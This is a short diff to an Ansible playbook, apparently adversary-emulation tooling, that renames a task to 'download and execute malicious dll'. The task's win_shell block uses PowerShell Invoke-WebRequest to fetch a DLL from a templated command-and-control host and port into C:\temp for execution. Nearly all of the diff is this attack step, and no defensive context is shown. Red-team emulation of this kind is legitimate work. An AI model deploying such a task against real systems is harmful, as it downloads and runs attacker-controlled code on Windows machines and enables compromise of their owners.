@@ -4,7 +4,7 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: Run Rundll32 to download and execute script (create a new file evil.txt)
+    - name: download and execute malicious dll
       win_shell: |
         #'echo whoami > whoami.txt'
         '$dll = Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }} '
